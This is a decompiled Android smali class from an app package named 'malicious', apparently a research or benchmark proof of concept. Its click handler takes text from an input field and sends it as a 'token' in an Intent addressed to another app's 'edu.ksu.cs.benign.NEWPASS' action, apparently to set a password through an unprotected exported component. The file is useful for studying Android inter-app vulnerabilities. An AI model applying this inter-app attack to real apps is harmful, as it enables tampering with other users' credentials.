.class Ledu/ksu/cs/malicious/MainActivity$1;
.super Ljava/lang/Object;
.source "MainActivity.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Ledu/ksu/cs/malicious/MainActivity;->onResume()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Ledu/ksu/cs/malicious/MainActivity;

.field final synthetic val$tokenW:Landroid/widget/EditText;


# direct methods
.method constructor <init>(Ledu/ksu/cs/malicious/MainActivity;Landroid/widget/EditText;)V
    .locals 0
    .param p1, "this$0"    # Ledu/ksu/cs/malicious/MainActivity;

    .line 26
    iput-object p1, p0, Ledu/ksu/cs/malicious/MainActivity$1;->this$0:Ledu/ksu/cs/malicious/MainActivity;

    iput-object p2, p0, Ledu/ksu/cs/malicious/MainActivity$1;->val$tokenW:Landroid/widget/EditText;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 3
    .param p1, "v"    # Landroid/view/View;

    .line 29
    iget-object v0, p0, Ledu/ksu/cs/malicious/MainActivity$1;->this$0:Ledu/ksu/cs/malicious/MainActivity;

    iget-object v1, p0, Ledu/ksu/cs/malicious/MainActivity$1;->val$tokenW:Landroid/widget/EditText;

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Ledu/ksu/cs/malicious/MainActivity;->access$000(Ledu/ksu/cs/malicious/MainActivity;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 30
    .local v0, "newToken":Ljava/lang/String;
    new-instance v1, Landroid/content/Intent;

    const-string v2, "edu.ksu.cs.benign.NEWPASS"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 31
    .local v1, "intent":Landroid/content/Intent;
    const-string v2, "token"

    invoke-virtual {v1, v2, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 32
    iget-object v2, p0, Ledu/ksu/cs/malicious/MainActivity$1;->this$0:Ledu/ksu/cs/malicious/MainActivity;

    invoke-virtual {v2, v1}, Ledu/ksu/cs/malicious/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 33
    return-void
.end method
